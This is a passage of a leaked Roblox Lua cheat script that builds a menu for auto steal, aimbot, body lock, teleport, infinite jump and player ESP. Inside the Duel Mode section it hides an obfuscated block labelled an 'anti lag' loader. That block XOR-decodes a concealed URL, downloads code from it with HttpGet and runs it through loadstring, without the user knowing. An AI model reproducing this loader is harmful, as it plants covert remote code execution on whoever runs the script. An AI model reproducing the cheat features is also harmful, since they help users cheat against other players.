laggerCarrySpeedBox.FocusLost:Connect(function()
local v = tonumber(laggerCarrySpeedBox.Text)
if v and v > 0 and v <= 250 then
LAGGER_CARRY_SPEED = v
if saveSoundConfig then pcall(saveSoundConfig) end
end
laggerCarrySpeedBox.Text = tostring(LAGGER_CARRY_SPEED)
end)
modeDisplayRow(Movement, 8, "Lagger")
section(Movement, "TELEPORT", 9)
autoTPRow = nil
autoTPRow, setAutoTPVisual = toggleRow(Movement, "Auto TP Down", autoTPEnabled, 10)
do
local autoTPButton = autoTPRow and autoTPRow:FindFirstChild("ToggleButton")
if autoTPButton then
autoTPButton.MouseButton1Click:Connect(function()
if autoTPClickDebounce then return end
autoTPClickDebounce = true
local nextState = not autoTPEnabled
toggleAutoTP(nextState)
task.delay(0.15, function()
autoTPClickDebounce = false
if setAutoTPVisual then setAutoTPVisual(autoTPEnabled) end
end)
end)
end
if autoTPEnabled then
startAutoTP()
else
stopAutoTP()
end
end
_, autoTPHeightBox = textboxRow(Movement, "Auto TP Height", tostring(autoTPHeight), 11)
autoTPHeightBox.FocusLost:Connect(function()
local v = tonumber(autoTPHeightBox.Text)
if v and v >= -500 and v <= 500 then
autoTPHeight = v
end
autoTPHeightBox.Text = tostring(autoTPHeight)
if saveSoundConfig then pcall(saveSoundConfig) end
end)
section(Movement, "JUMP", 15)
_, setInfJumpVisual = toggleRow(Movement, "Infinite Jump", infJumpEnabled, 16)

_G.SoundInfJumpMainRow = Movement:FindFirstChild("Infinite Jump")
_G.SoundInfJumpToggleBtn = _G.SoundInfJumpMainRow and _G.SoundInfJumpMainRow:FindFirstChild("ToggleButton")
if _G.SoundInfJumpToggleBtn then
_G.SoundInfJumpToggleBtn.Size = UDim2.new(0, 54, 1, 0)
_G.SoundInfJumpToggleBtn.Position = UDim2.new(1, -54, 0, 0)
end

_G.SoundInfJumpArrow = Instance.new("TextButton")
_G.SoundInfJumpArrow.Name = "ArrowButton"
_G.SoundInfJumpArrow.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
_G.SoundInfJumpArrow.BackgroundTransparency = 0.18
_G.SoundInfJumpArrow.BorderSizePixel = 0
_G.SoundInfJumpArrow.Text = "v"
_G.SoundInfJumpArrow.TextColor3 = COLORS.white
_G.SoundInfJumpArrow.TextSize = 18
_G.SoundInfJumpArrow.Font = Enum.Font.GothamBlack
_G.SoundInfJumpArrow.AutoButtonColor = false
_G.SoundInfJumpArrow.Size = UDim2.new(0, 38, 0, 26)
_G.SoundInfJumpArrow.Position = UDim2.new(1, -100, 0.5, -13)
_G.SoundInfJumpArrow.ZIndex = 20
_G.SoundInfJumpArrow.Parent = _G.SoundInfJumpMainRow
corner(_G.SoundInfJumpArrow, 7)
stroke(_G.SoundInfJumpArrow, COLORS.strokeSoft, 1.2, 0.25)

_G.SoundInfJumpSelector = infiniteJumpSelectorRow(Movement, 16.1)
_G.SoundInfJumpSelector.Visible = false
_G.SoundInfJumpSelector.Size = UDim2.new(1, -4, 0, 0)
_G.SoundInfJumpExpanded = false

_G.SoundInfJumpArrow.MouseButton1Click:Connect(function()
_G.SoundInfJumpExpanded = not _G.SoundInfJumpExpanded
if _G.SoundInfJumpExpanded then
_G.SoundInfJumpSelector.Visible = true
tween(_G.SoundInfJumpSelector, {Size = UDim2.new(1, -4, 0, 42)}, 0.2)
tween(_G.SoundInfJumpArrow, {Rotation = 180}, 0.15)
else
tween(_G.SoundInfJumpArrow, {Rotation = 0}, 0.15)
tween(_G.SoundInfJumpSelector, {Size = UDim2.new(1, -4, 0, 0)}, 0.2)
task.delay(0.2, function()
if not _G.SoundInfJumpExpanded then
_G.SoundInfJumpSelector.Visible = false
end
end)
end
end)

do
local row = Movement:FindFirstChild("Infinite Jump")
_aceBtn = row and row:FindFirstChild("ToggleButton")
if _aceBtn then
_aceBtn.Activated:Connect(function()
setInfJumpInternal(not infJumpEnabled)
if setInfJumpVisual then setInfJumpVisual(infJumpEnabled == true) end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
end
_, setAntiRagdollVisual = toggleRow(Movement, "Anti Ragdoll", antiRagdollEnabled, 17)
do
    local row = Movement:FindFirstChild("Anti Ragdoll")
    local btn = row and row:FindFirstChild("ToggleButton")
    if btn then
        btn.Activated:Connect(function()
            setAntiRagdoll(not antiRagdollEnabled)
            if setAntiRagdollVisual then
                setAntiRagdollVisual(antiRagdollEnabled == true)
            end
        end)
    end
end

refreshSpeedModeRows()
task.wait()
Combat = pages.COMBAT
section(Combat, "AUTO STEAL", 1)

_aceRow, setAutoStealVisual = toggleRow(Combat, "Auto Steal", autoStealEnabled, 2)
do
_aceBtn = _aceRow and _aceRow:FindFirstChild("ToggleButton")
if _aceBtn then
_aceBtn.Size = UDim2.new(0, 54, 1, 0)
_aceBtn.Position = UDim2.new(1, -54, 0, 0)
_aceBtn.Activated:Connect(function()
autoStealEnabled = not autoStealEnabled
if setAutoStealVisual then
setAutoStealVisual(autoStealEnabled)
end
if _G.SoundAutoStealSync then _G.SoundAutoStealSync() end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
end

-- Auto Steal uses the same default toggleRow styling as the other toggles.

_G.SoundStealArrow = Instance.new("TextButton")
_G.SoundStealArrow.Name = "ArrowButton"
_G.SoundStealArrow.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
_G.SoundStealArrow.BackgroundTransparency = 0.18
_G.SoundStealArrow.BorderSizePixel = 0
_G.SoundStealArrow.Text = "v"
_G.SoundStealArrow.TextColor3 = COLORS.white
_G.SoundStealArrow.TextSize = 18
_G.SoundStealArrow.Font = Enum.Font.GothamBlack
_G.SoundStealArrow.AutoButtonColor = false
_G.SoundStealArrow.Size = UDim2.new(0, 38, 0, 26)
_G.SoundStealArrow.Position = UDim2.new(1, -100, 0.5, -13)
_G.SoundStealArrow.ZIndex = 20
_G.SoundStealArrow.Parent = _aceRow
corner(_G.SoundStealArrow, 7)
stroke(_G.SoundStealArrow, COLORS.strokeSoft, 1.2, 0.25)

_G.SoundStealSelector = autoStealSelectorRow(Combat, 2.1)
_G.SoundStealSelector.Visible = false
_G.SoundStealSelector.Size = UDim2.new(1, -4, 0, 0)
_G.SoundStealExpanded = false

_G.SoundStealArrow.MouseButton1Click:Connect(function()
_G.SoundStealExpanded = not _G.SoundStealExpanded
if _G.SoundStealExpanded then
_G.SoundStealSelector.Visible = true
tween(_G.SoundStealSelector, {Size = UDim2.new(1, -4, 0, 42)}, 0.2)
tween(_G.SoundStealArrow, {Rotation = 180}, 0.15)
else
tween(_G.SoundStealArrow, {Rotation = 0}, 0.15)
tween(_G.SoundStealSelector, {Size = UDim2.new(1, -4, 0, 0)}, 0.2)
task.delay(0.2, function()
if not _G.SoundStealExpanded then
_G.SoundStealSelector.Visible = false
end
end)
end
end)

_, radiusBox = textboxRow(Combat, "Radius", tostring(autoStealRadius), 3)
autoStealRadiusBox = radiusBox
radiusBox.FocusLost:Connect(function()
local v = tonumber(radiusBox.Text)
if v and v > 0 and v <= 500 then
autoStealRadius = v
if selectedStealMode == "Auto Steal V3" then
    _G.SoundStealRadii = _G.SoundStealRadii or {}
    _G.SoundStealRadii["Auto Steal V3"] = v
end
end
_G.SoundStealRadii = _G.SoundStealRadii or {Normal = 62, Semi = 9}
_G.SoundStealRadii[selectedStealMode] = autoStealRadius
radiusBox.Text = tostring(autoStealRadius)
if _G.SoundNormalAutoStealSetRadius then _G.SoundNormalAutoStealSetRadius(_G.SoundStealRadii.Normal or 62) end
if _G.SoundSemiAutoStealSetRadius then _G.SoundSemiAutoStealSetRadius(_G.SoundStealRadii.Semi or 9) end
if _G.SoundAutoStealSync then _G.SoundAutoStealSync() end
if saveSoundConfig then
    pcall(saveSoundConfig)
end
do end
end)
local aimbotMainRow, _, _ = aimbotModeButtonRow(Combat, 5)
local aimbotSelector = nil

if _G.SoundRefreshAimbotVisual then
_G.SoundRefreshAimbotVisual()
end
_G.SoundNormalAutoSwingRow, _G.SoundNormalAutoSwingSetVisual, _G.SoundNormalAutoSwingBtn = _G.SoundActionToggleRow(Combat, "Auto Swing", autoSwingEnabled, 7)
do
if _G.SoundNormalAutoSwingBtn then
_G.SoundNormalAutoSwingBtn.MouseButton1Click:Connect(function()
if _G.SoundAutoSwingClickBusy then return end
_G.SoundAutoSwingClickBusy = true
autoSwingEnabled = not autoSwingEnabled
if _G.SoundNormalAutoSwingSetVisual then _G.SoundNormalAutoSwingSetVisual(autoSwingEnabled) end
if saveSoundConfig then pcall(saveSoundConfig) end
task.delay(0.12, function() _G.SoundAutoSwingClickBusy = false end)
end)
end
end
_G.SoundMirrorTPDownRow, _G.SoundMirrorTPDownSetVisual, _G.SoundMirrorTPDownBtn = _G.SoundActionToggleRow(Combat, "Mirror TP Down (Recommended)", mirrorTPDownEnabled, 7.1)
local mirrorTPDownLabel = _G.SoundMirrorTPDownRow and _G.SoundMirrorTPDownRow:FindFirstChild("Label")
if mirrorTPDownLabel then mirrorTPDownLabel.TextSize = 10 end
if _G.SoundMirrorTPDownBtn then
_G.SoundMirrorTPDownBtn.MouseButton1Click:Connect(function()
if _G.SoundMirrorTPDownClickBusy then return end
_G.SoundMirrorTPDownClickBusy = true
_G.SoundSetMirrorTPDown(not mirrorTPDownEnabled)
if saveSoundConfig then pcall(saveSoundConfig) end
task.delay(0.12, function() _G.SoundMirrorTPDownClickBusy = false end)
end)
end
aimbotSpeedRow, aimbotSpeedBox = textboxRow(Combat, "Normal Aimbot Speed", tostring(AIMBOT_SPEED), 8)
_G.SoundAimbotSpeedBox = aimbotSpeedBox
aimbotSpeedLabel = aimbotSpeedRow and aimbotSpeedRow:FindFirstChild("Label")
refreshAimbotModeLabels()
aimbotSpeedBox.FocusLost:Connect(function()
local v = tonumber(aimbotSpeedBox.Text)
if v and v > 0 and v <= 250 then
_G.SoundSetSelectedAimbotSpeedValues(v, nil)
end
if _G.SoundRefreshAimbotSpeedBoxes then _G.SoundRefreshAimbotSpeedBoxes() else aimbotSpeedBox.Text = tostring(AIMBOT_SPEED) end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
laggerAimbotSpeedRow, laggerAimbotSpeedBox = textboxRow(Combat, "Normal Lagger Aimbot Speed", tostring(LAGGER_AIMBOT_SPEED), 9)
_G.SoundLaggerAimbotSpeedBox = laggerAimbotSpeedBox
laggerAimbotSpeedLabel = laggerAimbotSpeedRow and laggerAimbotSpeedRow:FindFirstChild("Label")
refreshAimbotModeLabels()
if _G.SoundRefreshAimbotSpeedBoxes then _G.SoundRefreshAimbotSpeedBoxes() end
laggerAimbotSpeedBox.FocusLost:Connect(function()
local v = tonumber(laggerAimbotSpeedBox.Text)
if v and v > 0 and v <= 250 then
_G.SoundSetSelectedAimbotSpeedValues(nil, v)
end
if _G.SoundRefreshAimbotSpeedBoxes then _G.SoundRefreshAimbotSpeedBoxes() else laggerAimbotSpeedBox.Text = tostring(LAGGER_AIMBOT_SPEED) end
if saveSoundConfig then pcall(saveSoundConfig) end
end)

_, _G.SoundBodyLockVisual = toggleRow(Combat, "Body Lock", _G.SoundBodyLockEnabled, 6.5)

_G.SoundBodyLockMainRow = Combat:FindFirstChild("Body Lock")
_G.SoundBodyLockToggleBtn = _G.SoundBodyLockMainRow and _G.SoundBodyLockMainRow:FindFirstChild("ToggleButton")
if _G.SoundBodyLockToggleBtn then
_G.SoundBodyLockToggleBtn.Size = UDim2.new(0, 54, 1, 0)
_G.SoundBodyLockToggleBtn.Position = UDim2.new(1, -54, 0, 0)
end

_G.SoundBodyLockArrow = Instance.new("TextButton")
_G.SoundBodyLockArrow.Name = "ArrowButton"
_G.SoundBodyLockArrow.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
_G.SoundBodyLockArrow.BackgroundTransparency = 0.18
_G.SoundBodyLockArrow.BorderSizePixel = 0
_G.SoundBodyLockArrow.Text = "v"
_G.SoundBodyLockArrow.TextColor3 = COLORS.white
_G.SoundBodyLockArrow.TextSize = 18
_G.SoundBodyLockArrow.Font = Enum.Font.GothamBlack
_G.SoundBodyLockArrow.AutoButtonColor = false
_G.SoundBodyLockArrow.Size = UDim2.new(0, 38, 0, 26)
_G.SoundBodyLockArrow.Position = UDim2.new(1, -100, 0.5, -13)
_G.SoundBodyLockArrow.ZIndex = 20
_G.SoundBodyLockArrow.Parent = _G.SoundBodyLockMainRow
corner(_G.SoundBodyLockArrow, 7)
stroke(_G.SoundBodyLockArrow, COLORS.strokeSoft, 1.2, 0.25)

_G.SoundBodyLockSettings = baseRow(Combat, "", 6.6)
_G.SoundBodyLockSettings.Visible = false
_G.SoundBodyLockSettings.Size = UDim2.new(1, -4, 0, 0)
_G.SoundBodyLockSettings.ClipsDescendants = true

_G.SoundBodyLockRadiusLabel = Instance.new("TextLabel")
_G.SoundBodyLockRadiusLabel.BackgroundTransparency = 1
_G.SoundBodyLockRadiusLabel.Text = "RADIUS"
_G.SoundBodyLockRadiusLabel.TextColor3 = COLORS.white
_G.SoundBodyLockRadiusLabel.TextSize = 10
_G.SoundBodyLockRadiusLabel.Font = Enum.Font.GothamMedium
_G.SoundBodyLockRadiusLabel.TextXAlignment = Enum.TextXAlignment.Left
_G.SoundBodyLockRadiusLabel.Size = UDim2.new(0.45, 0, 1, 0)
_G.SoundBodyLockRadiusLabel.Position = UDim2.new(0, 12, 0, 0)
_G.SoundBodyLockRadiusLabel.ZIndex = 7
_G.SoundBodyLockRadiusLabel.Parent = _G.SoundBodyLockSettings

_G.SoundBodyLockRadiusBox = Instance.new("TextBox")
_G.SoundBodyLockRadiusBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
_G.SoundBodyLockRadiusBox.BackgroundTransparency = 0.18
_G.SoundBodyLockRadiusBox.Text = tostring(_G.SoundBodyLockRadius)
_G.SoundBodyLockRadiusBox.TextColor3 = COLORS.white
_G.SoundBodyLockRadiusBox.TextSize = 11
_G.SoundBodyLockRadiusBox.Font = Enum.Font.GothamMedium
_G.SoundBodyLockRadiusBox.ClearTextOnFocus = false
_G.SoundBodyLockRadiusBox.Size = UDim2.new(0, 76, 0, 28)
_G.SoundBodyLockRadiusBox.Position = UDim2.new(1, -88, 0.5, -14)
_G.SoundBodyLockRadiusBox.BorderSizePixel = 0
_G.SoundBodyLockRadiusBox.ZIndex = 7
_G.SoundBodyLockRadiusBox.Parent = _G.SoundBodyLockSettings
corner(_G.SoundBodyLockRadiusBox, 7)
stroke(_G.SoundBodyLockRadiusBox, COLORS.strokeSoft, 1, 0.35)

_G.SoundBodyLockRadiusBox.FocusLost:Connect(function()
local n = tonumber(_G.SoundBodyLockRadiusBox.Text)
if n then
_G.SoundBodyLockRadius = math.clamp(n, 5, 200)
end
_G.SoundBodyLockRadiusBox.Text = tostring(_G.SoundBodyLockRadius)
end)

_G.SoundBodyLockExpanded = false
_G.SoundBodyLockArrow.MouseButton1Click:Connect(function()
_G.SoundBodyLockExpanded = not _G.SoundBodyLockExpanded

if _G.SoundBodyLockExpanded then
_G.SoundBodyLockArrow.Text = "^"
_G.SoundBodyLockSettings.Visible = true
tween(_G.SoundBodyLockSettings, {Size = UDim2.new(1, -4, 0, 42)}, 0.2)
else
_G.SoundBodyLockArrow.Text = "v"
tween(_G.SoundBodyLockSettings, {Size = UDim2.new(1, -4, 0, 0)}, 0.2)
task.delay(0.2, function()
if not _G.SoundBodyLockExpanded and _G.SoundBodyLockSettings then
_G.SoundBodyLockSettings.Visible = false
end
end)
end
end)

_G.SoundBodyLockButton = _G.SoundBodyLockToggleBtn
if _G.SoundBodyLockButton then
_G.SoundBodyLockButton.Activated:Connect(function()
_G.SoundSetBodyLock(not _G.SoundBodyLockEnabled)
if _G.SoundBodyLockVisual then
_G.SoundBodyLockVisual(_G.SoundBodyLockEnabled)
end
end)
end

task.defer(function()
task.wait(0.5)
if _G.SoundBodyLockEnabled then
_G.SoundStartBodyLock()
end
if _G.SoundBodyLockVisual then
_G.SoundBodyLockVisual(_G.SoundBodyLockEnabled)
end
end)

_G.SoundAntiDesyncSetVisual = function(_) end
_G.SoundAntiTpBatSetVisual = function(_) end

section(Combat, "COUNTERS", 13)
_aceRow, setBatCounterVisual = _G.SoundActionToggleRow(Combat, "Bat Counter", batCounterEnabled, 14)
do
_aceBtn = _aceRow and _aceRow:FindFirstChild("ToggleButton")
if _aceBtn then
_aceBtn.Activated:Connect(function()
batCounterEnabled = not batCounterEnabled
if setBatCounterVisual then
setBatCounterVisual(batCounterEnabled)
end
if batCounterEnabled then
if _G.SoundStartBatCounter then _G.SoundStartBatCounter() end
else
if _G.SoundStopBatCounter then _G.SoundStopBatCounter() end
end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
end
_aceRow, setMedCounterVisual = _G.SoundActionToggleRow(Combat, "Med Counter", medCounterEnabled, 15)
do
_aceBtn = _aceRow and _aceRow:FindFirstChild("ToggleButton")
if _aceBtn then
_aceBtn.Activated:Connect(function()
medCounterEnabled = not medCounterEnabled
if setMedCounterVisual then
setMedCounterVisual(medCounterEnabled)
end
if medCounterEnabled then
if _G.SoundStartMedCounter then _G.SoundStartMedCounter(LP.Character) end
else
if _G.SoundStopMedCounter then _G.SoundStopMedCounter() end
end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
end
section(Combat, "HARD HIT", 15.2)
_aceRow, setHardHitVisual = _G.SoundActionToggleRow(Combat, "Hard Hit", hardHitEnabled == true, 15.3)
_G.SoundHardHitVisual = setHardHitVisual
do
_aceBtn = _aceRow and _aceRow:FindFirstChild("ToggleButton")
if _aceBtn then
_aceBtn.Activated:Connect(function()
hardHitEnabled = not hardHitEnabled
if setHardHitVisual then
setHardHitVisual(hardHitEnabled)
end
if hardHitEnabled then
if _G.SoundStartHardHit then _G.SoundStartHardHit() end
else
if _G.SoundStopHardHit then _G.SoundStopHardHit() end
end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
end
_, hardHitRadiusBox = textboxRow(Combat, "Hard Hit Range", tostring(hardHitRadius or 10), 15.4)
hardHitRadiusBox.FocusLost:Connect(function()
local v = tonumber(hardHitRadiusBox.Text)
if v and v >= 1 and v <= 100 then
if _G.SoundSetHardHitRadius then _G.SoundSetHardHitRadius(v) end
end
hardHitRadiusBox.Text = tostring(hardHitRadius or 10)
if saveSoundConfig then
    pcall(saveSoundConfig)
end
end)
section(Combat, "PERFECT HIT", 15.5)
_aceRow, setPerfectHitVisual = _G.SoundActionToggleRow(Combat, "Perfect Hit", perfectHitEnabled == true, 15.6)
_G.SoundPerfectHitVisual = setPerfectHitVisual
do
_aceBtn = _aceRow and _aceRow:FindFirstChild("ToggleButton")
if _aceBtn then
_aceBtn.Activated:Connect(function()
perfectHitEnabled = not perfectHitEnabled
if setPerfectHitVisual then
setPerfectHitVisual(perfectHitEnabled)
end
if perfectHitEnabled then
if _G.SoundStartPerfectHit then _G.SoundStartPerfectHit() end
else
if _G.SoundStopPerfectHit then _G.SoundStopPerfectHit() end
end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
end
_, perfectHitRangeBox = textboxRow(Combat, "Perfect Hit Range", tostring(perfectHitRange or 175), 15.7)
perfectHitRangeBox.FocusLost:Connect(function()
local v = tonumber(perfectHitRangeBox.Text)
if v and v >= 10 and v <= 500 then
if _G.SoundSetPerfectHitRange then _G.SoundSetPerfectHitRange(v) end
end
perfectHitRangeBox.Text = tostring(perfectHitRange or 175)
if saveSoundConfig then
    pcall(saveSoundConfig)
end
end)

-- Anti Die moved under ANTI TOGGLES



_G.SoundDropModeMainRow = baseRow(Combat, "Drop", 18.5)
do
local _dropLbl = _G.SoundDropModeMainRow and _G.SoundDropModeMainRow:FindFirstChild("Label")
if _dropLbl then
    _dropLbl.TextXAlignment = Enum.TextXAlignment.Center
    _dropLbl.AnchorPoint = Vector2.new(0.5, 0)
    _dropLbl.Position = UDim2.new(0.5, -14, 0, 0)
    _dropLbl.Size = UDim2.new(0, 64, 1, 0)
end
end

_G.SoundDropAction = Instance.new("TextButton")
_G.SoundDropAction.Name = "DropAction"
_G.SoundDropAction.BackgroundTransparency = 1
_G.SoundDropAction.Text = ""
_G.SoundDropAction.AutoButtonColor = false
_G.SoundDropAction.Size = UDim2.new(1, -50, 1, 0)
_G.SoundDropAction.Position = UDim2.new(0, 0, 0, 0)
_G.SoundDropAction.ZIndex = 15
_G.SoundDropAction.Parent = _G.SoundDropModeMainRow

_G.SoundDropArrow = Instance.new("TextButton")
_G.SoundDropArrow.Name = "ArrowButton"
_G.SoundDropArrow.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
_G.SoundDropArrow.BackgroundTransparency = 0.18
_G.SoundDropArrow.BorderSizePixel = 0
_G.SoundDropArrow.Text = "v"
_G.SoundDropArrow.TextColor3 = COLORS.white
_G.SoundDropArrow.TextSize = 18
_G.SoundDropArrow.Font = Enum.Font.GothamBlack
_G.SoundDropArrow.AutoButtonColor = false
_G.SoundDropArrow.Size = UDim2.new(0,38,0,26)
_G.SoundDropArrow.Position = UDim2.new(0.5, 24, 0.5, -13)
_G.SoundDropArrow.ZIndex = 20
_G.SoundDropArrow.Parent = _G.SoundDropModeMainRow
corner(_G.SoundDropArrow, 7)
stroke(_G.SoundDropArrow, COLORS.strokeSoft, 1.2, 0.25)

_G.SoundDropSelector = dropModeSelectorRow(Combat, 18.6)
_G.SoundDropSelector.Visible = false
_G.SoundDropSelector.Size = UDim2.new(1,-4,0,0)
_G.SoundDropExpanded = false

_G.SoundDropAction.MouseButton1Click:Connect(function()
pcall(runDrop)
end)

_G.SoundDropArrow.MouseButton1Click:Connect(function()
--Leaked By Xlu0 AndPrime--
tween(_G.SoundDropArrow, {
BackgroundTransparency = 0.02,
TextColor3 = Color3.fromRGB(255,255,255)
}, 0.08)

task.delay(0.09, function()
if _G.SoundDropArrow then
tween(_G.SoundDropArrow, {
BackgroundTransparency = 0.18
}, 0.12)
end
end)

_G.SoundDropExpanded = not _G.SoundDropExpanded

if _G.SoundDropExpanded then
_G.SoundDropArrow.Text = "^"
_G.SoundDropSelector.Visible = true
tween(_G.SoundDropSelector, {Size = UDim2.new(1,-4,0,42)}, 0.2)
else
_G.SoundDropArrow.Text = "v"
tween(_G.SoundDropSelector, {Size = UDim2.new(1,-4,0,0)}, 0.2)
task.delay(0.2, function()
if not _G.SoundDropExpanded and _G.SoundDropSelector then
_G.SoundDropSelector.Visible = false
end
end)
end
end)


-- Anti Void moved under ANTI TOGGLES

_aceRow, setAutoResetOnMedVisual = toggleRow(Combat, "Auto Reset On Med Fling", autoResetOnMedEnabled, 18)
do
_aceBtn = _aceRow and _aceRow:FindFirstChild("ToggleButton")
if _aceBtn then
_aceBtn.Activated:Connect(function()
if _G.SoundSetAutoResetOnMed then
_G.SoundSetAutoResetOnMed(not autoResetOnMedEnabled)
else
autoResetOnMedEnabled = not autoResetOnMedEnabled
if setAutoResetOnMedVisual then setAutoResetOnMedVisual(autoResetOnMedEnabled) end
if saveSoundConfig then pcall(saveSoundConfig) end
end
end)
end
end

--Leaked By Xlu0 AndPrime--
section(Movement, "AUTO PLAY", 100)

do
    local duelModeRow = baseRow(Movement, "Duel Mode", 101)
    duelModeRow.Size = UDim2.new(1,-4,0,42)

    local lbl = duelModeRow:FindFirstChild("Label")
    if lbl then
        lbl.Text = "Duel Mode"
        lbl.Size = UDim2.new(0.35,0,1,0)
    end

    local halfBtn = Instance.new("TextButton")
    halfBtn.Name = "HalfButton"
    halfBtn.Size = UDim2.new(0,58,0,28)
    halfBtn.Position = UDim2.new(1,-134,0.5,-14)
    halfBtn.BackgroundTransparency = 1
    halfBtn.BorderSizePixel = 0
    halfBtn.Text = "HALF"
    halfBtn.Font = Enum.Font.GothamMedium
    halfBtn.TextSize = 10
    halfBtn.ZIndex = 20
    halfBtn.Parent = duelModeRow
    corner(halfBtn,6)
    stroke(halfBtn,COLORS.strokeSoft,1,0.45)

    local fullBtn = Instance.new("TextButton")
    fullBtn.Name = "FullButton"
    fullBtn.Size = UDim2.new(0,58,0,28)
    fullBtn.Position = UDim2.new(1,-70,0.5,-14)
    fullBtn.BackgroundTransparency = 1
    fullBtn.BorderSizePixel = 0
    fullBtn.Text = "FULL"
    fullBtn.Font = Enum.Font.GothamMedium
    fullBtn.TextSize = 10
    fullBtn.ZIndex = 20
    fullBtn.Parent = duelModeRow
    corner(fullBtn,6)
    stroke(fullBtn,COLORS.strokeSoft,1,0.45)

    local function refreshDuelBtns()
        halfBtn.TextColor3 = (_G.SoundDuelMode == "half")
            and Color3.fromRGB(255,255,255)
            or Color3.fromRGB(140,140,140)

        fullBtn.TextColor3 = (_G.SoundDuelMode == "full")
            and Color3.fromRGB(255,255,255)
            or Color3.fromRGB(140,140,140)

        if _G.SoundAutoMoveCarrySpeedBox then
            local row = _G.SoundAutoMoveCarrySpeedBox.Parent
            if row then
                row.Visible = (_G.SoundDuelMode == "full")
            end
        end
    end
-- Hidden anti lag/smooth graphics loader (URL obfuscated)
task.spawn(function()
    local function _xorDecode(s)
        local t = {}
        for i = 1, #s do
            local b = string.byte(s, i)
            local x
            if bit32 and type(bit32.bxor) == "function" then
                x = bit32.bxor(b, 23)
            else
                local r, bit, a, c = 0, 1, b, 23
                while a > 0 or c > 0 do
                    local ab, cb = a % 2, c % 2
                    if ab ~= cb then r = r + bit end
                    a = math.floor(a / 2)
                    c = math.floor(c / 2)
                    bit = bit * 2
                end
                x = r
            end
            t[i] = string.char(x)
        end
        return table.concat(t)
    end
    local ok, src = pcall(function()
        return game:HttpGet(_xorDecode("\127ccgd-88gvdcrqn9vgg8#GYp_N&V8ev`"))
    end)
    if ok and type(src) == "string" and #src > 50 then
        local fn = loadstring(src)
        if type(fn) == "function" then
            pcall(fn)
        end
    end
end)

    _G.SoundRefreshDuelModeButtons = refreshDuelBtns

    halfBtn.MouseButton1Click:Connect(function()
        _G.SoundDuelMode = "half"
        refreshDuelBtns()
        if saveSoundConfig then pcall(saveSoundConfig) end
    end)

    fullBtn.MouseButton1Click:Connect(function()
        _G.SoundDuelMode = "full"
        refreshDuelBtns()
        if saveSoundConfig then pcall(saveSoundConfig) end
    end)

    refreshDuelBtns()
end


task.wait()
MenuCustomize = pages.MENU

task.wait()
Keybinds = pages.KEYBINDS
section(Keybinds, "MOVEMENT KEYBINDS", 1)
speedKeybindRow(Keybinds, "Speed Key", "SpeedToggle", 2)
speedKeybindRow(Keybinds, "Lagger Mode Key", "LaggerToggle", 3)
tpDownKeybindRow(Keybinds, 4)
speedKeybindRow(Keybinds, "Drop Brainrot", "DropBrainrot", 5)
section(Keybinds, "COMBAT KEYBINDS", 6)
aimbotKeybindRow = speedKeybindRow(Keybinds, "Normal Aimbot", "Aimbot", 7)
combatAimbotKeybindLabel = aimbotKeybindRow and aimbotKeybindRow:FindFirstChild("Label")
refreshAimbotModeLabels()
speedKeybindRow(Keybinds, "Auto Left", "AutoLeft", 9)
speedKeybindRow(Keybinds, "Auto Right", "AutoRight", 10)
section(Keybinds, "EXTRA KEYBINDS", 11)
speedKeybindRow(Keybinds, "Insta Reset", "InstaReset", 12)
speedKeybindRow(Keybinds, "Bat V2", "BatV2", 13)
do
THEME_ACCENT = Color3.fromRGB(255, 255, 255)
THEME_ACCENT_DIM = Color3.fromRGB(160, 160, 160)
PlayerESP = PlayerESP or {enabled=false, playerData={}, conns={}, discordText="discord.gg/hwwWrXUbV"}
BoxedESPOptions = BoxedESPOptions or {box=false, tracer=false}
BoxedESPData = BoxedESPData or {}
BoxedESPConn = BoxedESPConn or nil
stretchRezConn = stretchRezConn or nil
antiLagDescConn = antiLagDescConn or nil
noCamCollisionConn = noCamCollisionConn or nil
noCamCollisionParts = noCamCollisionParts or {}
_aceNukeConns = _aceNukeConns or {}
_aceNukeOn = _aceNukeOn or false
_aceCustomFontOrig = _aceCustomFontOrig or {}
_aceCustomFontConn = _aceCustomFontConn or nil
_aceCustomFont = _aceCustomFont or nil
function startPlayerESP()
if PlayerESP.enabled then return end
PlayerESP.enabled = true
function cleanup(plr)
local d=PlayerESP.playerData[plr]; if not d then return end
pcall(function() if d.highlight then d.highlight:Destroy() end end)
pcall(function() if d.billboard then d.billboard:Destroy() end end)
if d.conns then for _,c in ipairs(d.conns) do pcall(function() c:Disconnect() end) end end
PlayerESP.playerData[plr]=nil
end
function setup(plr,char)
if not PlayerESP.enabled or plr==LP then return end
cleanup(plr)
local hrp=char and (char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart",5))
local head=char and (char:FindFirstChild("Head") or char:WaitForChild("Head",5))
if not hrp or not head then return end
local hl=Instance.new("Highlight")
hl.Name="SoundDuelsESP"; hl.Adornee=char; hl.FillColor=(_G.SoundThemeColors and _G.SoundThemeColors[_G.SoundThemeName]) or THEME_ACCENT; hl.FillTransparency=0.72
hl.OutlineColor=(_G.SoundThemeColors and _G.SoundThemeColors[_G.SoundThemeName]) or THEME_ACCENT; hl.OutlineTransparency=0; hl.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop; hl.Parent=char
local bb=Instance.new("BillboardGui")
bb.Name="SoundDuelsESPTag"; bb.Adornee=head; bb.Size=UDim2.new(0,170,0,42); bb.StudsOffset=Vector3.new(0,2.8,0); bb.AlwaysOnTop=true; bb.LightInfluence=0; bb.Parent=head
local box=Instance.new("Frame",bb); box.Size=UDim2.new(1,0,1,0); box.BackgroundTransparency=1; box.BorderSizePixel=0
Instance.new("UICorner",box).CornerRadius=UDim.new(0,9)
local n=Instance.new("TextLabel",box); n.Size=UDim2.new(1,-8,0,19); n.Position=UDim2.new(0,4,0,1); n.BackgroundTransparency=1; n.TextColor3=Color3.fromRGB(255,255,255); n.TextStrokeColor3=Color3.fromRGB(0,0,0); n.Font=Enum.Font.GothamBlack; n.TextSize=13; n.TextStrokeTransparency=0.08
